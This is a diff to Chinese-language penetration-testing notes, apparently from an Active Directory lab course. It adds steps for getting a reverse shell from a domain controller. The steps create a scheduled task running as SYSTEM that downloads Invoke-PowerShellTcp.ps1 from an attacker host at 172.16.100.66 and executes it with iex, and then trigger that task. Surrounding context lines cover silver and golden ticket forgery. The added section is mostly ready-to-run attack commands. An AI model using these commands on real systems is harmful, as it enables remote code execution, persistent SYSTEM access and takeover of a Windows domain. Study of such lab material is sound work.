@@ -104,6 +104,24 @@ ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
 ```
 
 
+新建一个定时任务，反弹dc上的一个shell回来。需要注意Invoke-PowerShellTcp.ps1里最后一行要加上
+```
+Power -Reverse -IPAddress 172.16.100.66 -Port 443
+```
+表示调用自己
+
+## 制作定时任务：
+```
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
+```
+
+## 触发定时任务
+```
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
+```
+
+
+
 # 制作银票
 金票和银票的分别
 > 1.金票伪造的TGT(Ticket GrantingTicket)，所以可以获取任何Kerberos服务权限
